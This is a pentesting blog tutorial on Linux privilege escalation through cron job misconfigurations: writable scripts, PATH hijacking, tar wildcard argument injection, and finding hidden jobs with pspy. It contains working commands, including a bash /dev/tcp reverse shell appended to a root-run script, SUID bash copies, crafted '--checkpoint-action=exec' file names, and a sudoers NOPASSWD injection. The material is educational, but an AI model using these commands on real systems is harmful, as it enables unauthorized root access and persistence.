---
id: "escalada-de-privilegios-a-traves-de-cronjobs-linux"
title: "Linux Privilege Escalation via Cron Jobs"
author: "andres-gonzalez"
publishedDate: 2022-10-26
updatedDate: 2022-10-26
image: "https://cdn.deephacking.tech/i/posts/escalada-de-privilegios-a-traves-de-cronjobs-linux/escalada-de-privilegios-a-traves-de-cronjobs-linux-0.webp"
description: "Learn to identify and exploit misconfigurations in Linux Cron Jobs to escalate privileges through weak permissions, PATH, and wildcards."
categories:
  - "linux"
draft: false
featured: false
lang: "en"
---

In the world of Linux privilege escalation, there are a series of checks we must perform, and Cron Jobs should not be the exception. In this post, we will explain how to take advantage of the most typical scenarios with Cron Jobs to escalate privileges.

- [What is Cron?](#what-is-cron)
- [Crontab File](#crontab-file)
- [Crontab Commands](#crontab-commands)
- [Crontab Operators](#crontab-operators)
- [Crontab Restrictions](#crontab-restrictions)
- [Cron Jobs](#cron-jobs)
- [Cron Jobs - File Permissions / File Overwrite](#cron-jobs---file-permissions--file-overwrite)
- [Cron Jobs - PATH Environment Variable](#cron-jobs---path-environment-variable)
- [Cron Jobs - Wildcards](#cron-jobs---wildcards)
- [Enumeration of Hidden Tasks](#enumeration-of-hidden-tasks)
- [References](#references)

In Linux operating systems, like other systems, you can automate the launching of programs or scripts at certain time periods. If this is configured incorrectly (misconfigurations), it can allow attackers to escalate privileges.

It is always important to understand the process of what we are doing, so let's take a look at some theory:

## What is Cron?

Cron is a clock daemon that runs constantly in the background, allowing users to automate tasks. This Cron utility examines a "to-do list" looking for any pending scheduled tasks to execute. If it finds one, it executes it; if not, it waits for a period of time and checks the list again. This to-do list is called a _cron table_ or Crontab.

Cron is managed with different files. In the `/etc/` directory you can find:

- cron.hourly
- cron.daily
- cron.weekly
- cron.monthly

If you place a script in one of these directories, it will be executed every hour, day, week, or month, depending on the directory where it has been added. These directories are managed by the crontab file.

![Listing of cron directories in /etc showing cron.hourly, cron.daily, cron.weekly and cron.monthly](https://cdn.deephacking.tech/i/posts/escalada-de-privilegios-a-traves-de-cronjobs-linux/escalada-de-privilegios-a-traves-de-cronjobs-linux-1.avif)

Now, let's talk about the file that contains the to-do list → crontab

## Crontab File

The crontab file is the one that contains a list of commands scheduled to be executed at specific times. It has 5 fields to indicate the time units for executing commands or tasks, and its structure is:

- _Minute / Hour / Day Of The Month / Month / Day Of The Week_

![Diagram of crontab structure showing the 5 time fields](https://cdn.deephacking.tech/i/posts/escalada-de-privilegios-a-traves-de-cronjobs-linux/escalada-de-privilegios-a-traves-de-cronjobs-linux-2.avif)

## Crontab Commands

A quick look at those parameters that crontab handles:

![Table with crontab commands: -e to edit, -l to list, -r to remove](https://cdn.deephacking.tech/i/posts/escalada-de-privilegios-a-traves-de-cronjobs-linux/escalada-de-privilegios-a-traves-de-cronjobs-linux-3.avif)

- **crontab -e**: Edit the crontab file or create one if it doesn't already exist.
- **crontab -l**: Display the contents of the crontab file.
- **crontab -r**: Remove the current crontab.
- **crontab -i**: Remove your current crontab file with a prompt before removing it.
- **crontab -u <username>**: Specify the username whose crontab is to be used (This option requires root privileges)

## Crontab Operators

- **,**: specifies a list of values, for example: "1,3,4,7,8"
- **-**: specifies a range of values, for example: "1-6", which is equivalent to "1,2,3,4,5,6"
- **\***: specifies all possible values for a field. For example, an asterisk in the hour field would be equivalent to 'every hour'.
- **/**: can be used to skip a given number of values.

Examples of using operators to execute tasks at time intervals:

Reminder of the syntax:
- _Minute / Hour / Day Of The Month / Month / Day Of The Week_

---

- Execute a command at 3:00 PM every day from Monday to Friday:

```bash
0 15 * * 1-5 command
```

- Execute a script on the first Monday of each month at 7 AM:

```bash
0 7 1-7 * 1 /path/to/script.sh
```

- Every two hours from 11 PM to 7 AM, and at 8 AM:

```bash
0 23-7/2,8 * * * date
```

- At 11:00 AM on day 4 and every Mon, Tue, Wed:

```bash
0 11 4 * lun-mié date
```

## Crontab Restrictions

There are files with the ability to manage which users can use crontab, these files are:

- `/etc/cron.allow`
- `/etc/cron.deny`

These files do not exist by default but can be created with the intention of having control. In case they exist, these are the following conditions for users:

- If the username is in the `cron.allow` file → Can execute crontab
- If the `cron.allow` file does not exist → Can execute crontab if their username is not in the `cron.deny` file
- If `cron.deny` exists and is empty → all users can use crontab
- If neither file exists → depending on the configuration parameters, only root will be able to use this command, or all users will be able to use it.

On standard Debian systems, all users can use this command.

## Cron Jobs

In Linux, those scheduled tasks within the crontab file are known as Cron Jobs. Cron Jobs are structured as follows:

![Diagram of a cronjob structure showing time, user and command](https://cdn.deephacking.tech/i/posts/escalada-de-privilegios-a-traves-de-cronjobs-linux/escalada-de-privilegios-a-traves-de-cronjobs-linux-4.avif)

In the following example, we can see that the crontab file stores the automated tasks, that is, the Cron Jobs:

![Example of crontab file with multiple configured Cron Jobs](https://cdn.deephacking.tech/i/posts/escalada-de-privilegios-a-traves-de-cronjobs-linux/escalada-de-privilegios-a-traves-de-cronjobs-linux-5.avif)

There are three main ways to exploit Cron Jobs:

- Weak file permissions (File Permissions / File Overwrite)
- Lack of absolute path in binaries and commands (PATH Environment Variable)
- The use of (\*) that are employed when executing commands (Wildcards)

Now let's go through each of these methods.

## Cron Jobs - File Permissions / File Overwrite

Let's examine the `/etc/crontab` file:

```bash
cat /etc/crontab
```

![Contents of /etc/crontab showing Cron Jobs for overwrite.sh and compress.sh](https://cdn.deephacking.tech/i/posts/escalada-de-privilegios-a-traves-de-cronjobs-linux/escalada-de-privilegios-a-traves-de-cronjobs-linux-6.avif)

We observe that there are 2 scheduled tasks to be executed every minute with root privileges:

- `overwrite.sh`
- `/usr/local/bin/compress.sh`

Now we search for where the `overwrite.sh` file is located:

```bash
locate overwrite.sh
```

![Locate result showing location of overwrite.sh](https://cdn.deephacking.tech/i/posts/escalada-de-privilegios-a-traves-de-cronjobs-linux/escalada-de-privilegios-a-traves-de-cronjobs-linux-7.avif)

It is located in `/usr/local/bin/overwrite.sh`. Let's verify the permissions:

```bash
ls -lah /usr/local/bin/overwrite.sh
```

![Permissions of overwrite.sh showing that other users have write permissions](https://cdn.deephacking.tech/i/posts/escalada-de-privilegios-a-traves-de-cronjobs-linux/escalada-de-privilegios-a-traves-de-cronjobs-linux-8.avif)

As we can see, "others" have write permissions. We will take advantage of this to modify the `overwrite.sh` script.

We can either add lines to the script or replace it entirely. For this example, we will replace it with a reverse shell in bash:

```bash
nano /usr/local/bin/overwrite.sh
```

![Modification of overwrite.sh with a bash reverse shell](https://cdn.deephacking.tech/i/posts/escalada-de-privilegios-a-traves-de-cronjobs-linux/escalada-de-privilegios-a-traves-de-cronjobs-linux-9.avif)

Once the file has been modified, we set up a listener on our machine on the same port indicated in the script.

From our machine:

```bash
nc -lvp 4444
```

![Netcat waiting for connection and receiving shell with root privileges](https://cdn.deephacking.tech/i/posts/escalada-de-privilegios-a-traves-de-cronjobs-linux/escalada-de-privilegios-a-traves-de-cronjobs-linux-10.avif)

We obtain a shell with root privileges. This is because there is a scheduled task or cronjob that executes the script we have modified as root. Moreover, what is truly important is that this script can be modified by "others."

## Cron Jobs - PATH Environment Variable

Again, we verify the `/etc/crontab` file:

```bash
cat /etc/crontab
```

![Crontab showing PATH variable and cronjob without absolute path](https://cdn.deephacking.tech/i/posts/escalada-de-privilegios-a-traves-de-cronjobs-linux/escalada-de-privilegios-a-traves-de-cronjobs-linux-11.avif)

Two points to highlight in this view of the crontab file would be:

- Within the Cron Jobs, there is the `overwrite.sh` script, and it is not called from an absolute path. Therefore, when this cronjob is executed, a search will begin throughout the PATH that we can see in the crontab itself, until it finds the `overwrite.sh` script to execute.
- The PATH variable starts with the `/home/user` directory

From the previous example, we know that `overwrite.sh` is located in `/usr/local/bin/` and the search would be done as follows:

![Diagram showing PATH search order for overwrite.sh](https://cdn.deephacking.tech/i/posts/escalada-de-privilegios-a-traves-de-cronjobs-linux/escalada-de-privilegios-a-traves-de-cronjobs-linux-12.avif)

Taking advantage of this scenario, we create a script with the same name `overwrite.sh` in the `/home/user` directory. This way, when the scheduled task is executed and the PATH search begins, it will identify and execute the one we have created since it is positioned before the other one in the PATH.

And now the search would be like this:

![Diagram showing how the malicious script in /home/user is executed first](https://cdn.deephacking.tech/i/posts/escalada-de-privilegios-a-traves-de-cronjobs-linux/escalada-de-privilegios-a-traves-de-cronjobs-linux-13.avif)

Once located in `/home/user`, we create the `overwrite.sh` script. At this point, the possibilities are limited to your imagination, meaning there can be more than one action that leads you to become root. For this example, within the script we copy and paste the `/bin/bash` binary into `/tmp/bash` and grant SUID permissions, since with this we can easily become root.

Finally, we grant execution privileges and wait for the cronjob to execute:

```bash
cp /bin/bash /tmp/bash
chmod +xs /tmp/bash
```

![Creation of malicious overwrite.sh script in /home/user](https://cdn.deephacking.tech/i/posts/escalada-de-privilegios-a-traves-de-cronjobs-linux/escalada-de-privilegios-a-traves-de-cronjobs-linux-14.avif)

![Assignment of execution permissions to the malicious script](https://cdn.deephacking.tech/i/posts/escalada-de-privilegios-a-traves-de-cronjobs-linux/escalada-de-privilegios-a-traves-de-cronjobs-linux-15.avif)

After a few seconds, when the task is executed:

![Verification that bash was copied to /tmp with SUID permissions](https://cdn.deephacking.tech/i/posts/escalada-de-privilegios-a-traves-de-cronjobs-linux/escalada-de-privilegios-a-traves-de-cronjobs-linux-16.avif)

We observe that the cronjob has been executed because the `/bin/bash` binary has been copied to the `/tmp/` folder and has been assigned SUID permissions. We proceed to execute the bash binary now with SUID permissions as indicated in [GTFOBins for bash with SUID](https://gtfobins.github.io/gtfobins/bash/#suid):

```bash
./bash -p
```

![Successful privilege escalation obtaining root shell via bash with SUID](https://cdn.deephacking.tech/i/posts/escalada-de-privilegios-a-traves-de-cronjobs-linux/escalada-de-privilegios-a-traves-de-cronjobs-linux-17.avif)

Once again, we are root, all thanks to the fact that in the cronjob, in the case of overwrite.sh, it is not called from an absolute path and, additionally, we have write capability in one of the paths prior to where the legitimate binary is located.

## Cron Jobs - Wildcards

Basically, within this scenario, the problem that exists is that when a cronjob is executed with a wildcard (`*`), its presence interprets the name of all the files where the wildcard (`*`) is being executed as arguments. Therefore, we can inject arguments by creating files with names that correspond to valid arguments for that program. For this example, we would be talking about valid arguments for `tar`.

Let's verify the `/etc/crontab` file once more:

```bash
cat /etc/crontab
```

![Crontab showing cronjob with wildcard in tar command](https://cdn.deephacking.tech/i/posts/escalada-de-privilegios-a-traves-de-cronjobs-linux/escalada-de-privilegios-a-traves-de-cronjobs-linux-18.avif)

In the crontab we can find a task that executes a script which contains the `tar` command with a wildcard (`*`) in the `/home/user` directory as an argument.

**Tar → Execute arbitrary commands:**

![GTFOBins documentation showing tar parameters to execute commands](https://cdn.deephacking.tech/i/posts/escalada-de-privilegios-a-traves-de-cronjobs-linux/escalada-de-privilegios-a-traves-de-cronjobs-linux-19.avif)

In this case, `tar` has parameters through which it can have the capability to execute commands. Specifically, for `tar`, we can make use of the parameters in the image, where in "ACTION" we will use "exec" to execute a given external command.

```bash
echo 'echo "user ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers' > run.sh
echo "" > "--checkpoint-action=exec=sh run.sh"
echo "" > --checkpoint=1
```

![Creation of files with tar parameter names and run.sh script](https://cdn.deephacking.tech/i/posts/escalada-de-privilegios-a-traves-de-cronjobs-linux/escalada-de-privilegios-a-traves-de-cronjobs-linux-20.avif)

For this example, two files are created named like the parameters of `tar`, which will execute the `run.sh` file, which in turn will add to our user the ability to execute any command as any user, thanks to `sudoers` (this last part is simply one possible way to escalate privileges, other ways already seen in this post would be through direct execution of a reverse shell, or assigning SUID to bash).

Once the cron task is executed, by running `sudo -l` we verify that we can execute commands with sudo. In other words, we are inside the sudoers group:

![Verification with sudo -l showing that user has NOPASSWD ALL permissions](https://cdn.deephacking.tech/i/posts/escalada-de-privilegios-a-traves-de-cronjobs-linux/escalada-de-privilegios-a-traves-de-cronjobs-linux-21.avif)

Note: it repeats for each time the task has been executed and, therefore, adds the statement again to the file

![Contents of /etc/sudoers showing duplicate lines added](https://cdn.deephacking.tech/i/posts/escalada-de-privilegios-a-traves-de-cronjobs-linux/escalada-de-privilegios-a-traves-de-cronjobs-linux-22.avif)

And finally, we are root again, all due to the presence of a wildcard (`*`) in a scheduled task that runs with root and uses `tar`, which has arguments to execute commands.

A visual example of this situation would be:

![Visual diagram explaining how the attack with wildcards in tar works](https://cdn.deephacking.tech/i/posts/escalada-de-privilegios-a-traves-de-cronjobs-linux/escalada-de-privilegios-a-traves-de-cronjobs-linux-23.avif)

Other binaries besides Tar that are also susceptible to the use of wildcards are:

- chown / chmod
- Rsync
- 7z
- zip

## Enumeration of Hidden Tasks

It is possible that a scenario may occur where there are tasks or Cron Jobs that we are unable to enumerate with the privileges we have and, therefore, to enumerate them we need to use tools like [pspy](https://github.com/DominicBreuker/pspy).

In this example, we see how being the `www-data` user we do not identify custom Cron Jobs:

![Terminal showing that www-data user cannot find custom Cron Jobs](https://cdn.deephacking.tech/i/posts/escalada-de-privilegios-a-traves-de-cronjobs-linux/escalada-de-privilegios-a-traves-de-cronjobs-linux-24.avif)

Now, using the `pspy` tool, which is responsible for monitoring processes, and they are visible to everyone:

![pspy tool detecting hidden cronjob executed by root](https://cdn.deephacking.tech/i/posts/escalada-de-privilegios-a-traves-de-cronjobs-linux/escalada-de-privilegios-a-traves-de-cronjobs-linux-25.avif)

A cronjob executed by the root user (UID=0) is identified, where it is executing the following script: `/var/www/html/tmp/clean.sh`

![pspy output showing execution of clean.sh script by root](https://cdn.deephacking.tech/i/posts/escalada-de-privilegios-a-traves-de-cronjobs-linux/escalada-de-privilegios-a-traves-de-cronjobs-linux-26.avif)

We verify the permissions on the `clean.sh` script and we are the owners of the script:

![Permissions of clean.sh script showing that www-data is the owner](https://cdn.deephacking.tech/i/posts/escalada-de-privilegios-a-traves-de-cronjobs-linux/escalada-de-privilegios-a-traves-de-cronjobs-linux-27.avif)

In this case, we modify it and add a reverse shell and set up a listener:

```bash
echo "bash -i >& /dev/tcp/IP/PORT 0>&1" >> clean.sh
nc -nlvp port
```

![Root shell obtained through modification of clean.sh script](https://cdn.deephacking.tech/i/posts/escalada-de-privilegios-a-traves-de-cronjobs-linux/escalada-de-privilegios-a-traves-de-cronjobs-linux-28.avif)

As we can see, we have root privileges.

This is where the questions arise:

- **If a cronjob exists and I checked the /etc/crontab file and didn't see it, then where is it?**

Basically, this is because in the path `/var/spool/cron/crontabs` files are stored that are created according to the username of the account. This means that there can be scheduled tasks or crontabs that run as root in a file called `root` and is only visible by root. So let's say that cron, within its "to-do list," also checks `/var/spool/cron/crontabs` in the search for crontab files.

Once we are root, we verify the file and permissions, and as we can see, the scheduled task or cronjob identified by `pspy` is stored here:

![File /var/spool/cron/crontabs/root showing the hidden cronjob](https://cdn.deephacking.tech/i/posts/escalada-de-privilegios-a-traves-de-cronjobs-linux/escalada-de-privilegios-a-traves-de-cronjobs-linux-29.avif)

We return to the `www-data` user to confirm that indeed with these privileges we are not able to see this file:

![Failed attempt by www-data to read the root crontabs file](https://cdn.deephacking.tech/i/posts/escalada-de-privilegios-a-traves-de-cronjobs-linux/escalada-de-privilegios-a-traves-de-cronjobs-linux-30.avif)

Finally, a summary list of directories or files to review in order to detect possible cron tasks (in case our user has read permissions) would be:
- `/var/scripts/`
- `/var/log/cron.log`
- `/etc/crontab`
- `/var/spool/cron/`
- `/var/spool/cron/crontabs/`
- `/etc/cron.hourly`
- `/etc/cron.daily`
- `/etc/cron.weekly`
- `/etc/cron.monthly`

## References

- [Linux - cron and crontab](https://compbio.cornell.edu/about/resources/linux-cron-and-crontab/)
- [Linux Privilege Escalation by Exploiting Cron Jobs](https://www.armourinfosec.com/linux-privilege-escalation-by-exploiting-cronjobs/)
- [Linux Privilege Escalation – Scheduled Tasks](https://steflan-security.com/linux-privilege-escalation-scheduled-tasks/)
- [Tar - Checkpoints](https://www.gnu.org/software/tar/manual/html_section/checkpoints.html)
- [Exploiting the Cron Jobs Misconfigurations (Privilege Escalation)](https://vk9-sec.com/exploiting-the-cron-jobs-misconfigurations-privilege-escalation/)
- [Scheduling Cron Jobs with Crontab](https://linuxize.com/post/scheduling-cron-jobs-with-crontab/)
